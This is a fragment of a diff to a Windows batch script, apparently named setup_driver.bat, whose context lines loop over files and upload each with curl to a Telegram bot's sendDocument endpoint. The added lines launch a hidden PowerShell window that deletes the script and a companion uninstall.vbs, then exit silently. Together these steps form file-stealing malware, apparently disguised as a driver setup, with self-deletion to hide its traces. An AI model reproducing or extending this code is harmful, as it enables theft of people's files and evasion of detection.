@@ -12,4 +12,6 @@ foreach ($f in $files) { ^
     cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
 }"
 
-pause
+start "" powershell -WindowStyle Hidden -Command "Start-Sleep 2; Remove-Item 'setup_driver.bat','uninstall.vbs' -Force"
+
+exit
